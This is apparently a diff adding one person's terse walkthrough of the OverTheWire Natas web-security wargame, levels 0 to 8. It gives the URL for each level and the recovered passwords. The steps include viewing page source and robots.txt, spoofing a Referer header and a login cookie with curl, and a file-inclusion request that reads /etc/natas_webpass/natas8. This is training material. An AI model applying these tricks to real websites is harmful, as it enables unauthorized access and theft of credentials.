@@ -1,2 +1,69 @@
 Sydney Nguyen 
 
+0
+paste into URL: http://natas0.natas.labs.overthewire.org/
+Username:natas0
+Password:natas0
+
+0->1
+paste into URL: http://natas0.natas.labs.overthewire.org/
+Username: natas1
+Password: g9D9cREhslqBKtcA2uocGHPfMZVzeFK6 
+
+1->2
+paste into URL: http://natas1.natas.labs.overthewire.org/
+CTRL U
+Username: natas2
+Password: h4ubbcXrWqsTo7GGnnUMLppXbOogfBZ7 
+
+2->3
+paste into URL: http://natas2.natas.labs.overthewire.org/
+CTRL U 
+http://natas2.natas.labs.overthewire.org/files/
+click on users.txt
+Password: G6ctbMJ5Nb4cbFwhpMPSvxGHhQ7I6W8Q
+
+3->4 
+paste into URL: http://natas3.natas.labs.overthewire.org/
+CTRL U 
+http://natas3.natas.labs.overthewire.org/robots.txt
+http://natas3.natas.labs.overthewire.org/s3cr3t/
+click on users.txt
+Password:tKOcJIbzM4lTs8hbCmzn5Zr4434fGZQm
+
+4->5
+paste into URL: http://natas4.natas.labs.overthewire.org/
+Command prompt: curl -u natas4 -H "Referer: http://natas5.natas.labs.overthewire.org/" http://natas4.natas.labs.overthewire.org
+tKOcJIbzM4lTs8hbCmzn5Zr4434fGZQm
+Password:Z0NsrtIkJoKALBCLi5eqFfcRN82Au2oD
+
+5->6 
+CTRL SHIFT I
+network 
+index.php 
+reload page 
+Command prompt:  curl -u natas5 -b "loggedin = 1" http://natas5.natas.labs.overthewire.org
+Z0NsrtIkJoKALBCLi5eqFfcRN82Au2oD
+Password: fOIvE0MDtPTgRhqmmvvAOt2EfXR6uQgR
+
+6->7
+CTRL U
+http://natas6.natas.labs.overthewire.org/index-source.html
+http://natas6.natas.labs.overthewire.org/includes/secret.inc
+Input secret: FOEIUWGHFEEUHOFUOIU
+Password:jmxSiH3SP6Sonf8dv66ng8v1cIEdjXWr
+
+7->8
+click about 
+CTRL U 
+/etc/natas_webpass/natas8
+http://natas7.natas.labs.overthewire.org/index.php?page=/etc/natas_webpass/natas8
+Password:a6bZCNYwdKqN5cGP11ZdtPg0iImQQhAB
+
+8->9
+CTRL U 
+http://natas8.natas.labs.overthewire.org/index-source.html
+
+
+
+
